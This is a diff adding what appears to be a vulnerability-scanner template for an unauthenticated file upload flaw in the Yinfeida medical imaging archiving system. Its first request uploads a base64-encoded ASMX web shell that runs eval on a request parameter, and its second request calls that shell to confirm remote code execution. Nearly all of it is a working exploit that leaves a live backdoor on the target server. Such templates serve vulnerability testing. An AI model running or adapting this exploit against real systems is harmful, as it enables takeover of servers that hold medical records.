@@ -1,0 +1,46 @@
+http:
+    - raw:
+        - |
+          POST /webservices/WebJobUpload.asmx  HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: text/xml; charset=utf-8
+
+          <?xml version="1.0" encoding="utf-8"?>
+          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+          <jobUpload xmlns="http://rainier">
+          <vcode>1</vcode>
+          <subFolder></subFolder>
+          <fileName>rce.asmx</fileName>
+          <bufValue>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</bufValue>
+          </jobUpload>
+          </soap:Body>
+          </soap:Envelope>
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Hello,World
+        - negative: true
+          part: body
+          type: word
+          words:
+            - 1/rce.asmx/Cmdshell?Pass=Response.Write
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /1/rce.asmx/Cmdshell?Pass=Response.Write("Hello,World") HTTP/1.1
+          Host: {{Hostname}}
+id: yinfeida-files-upload
+info:
+    author: Superhero
+    description: 英飞达医学影像存档与通信系统 WebJobUpload 接口任意文件上传漏洞，未经身份攻击者可过洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 英飞达医学影像存档与通信系统 WebJobUpload 任意文件上传漏洞
+    severity: critical
+    tags:
+        - files-upload
+        - GPS
+        - 英飞达医学影像存档与通信系统
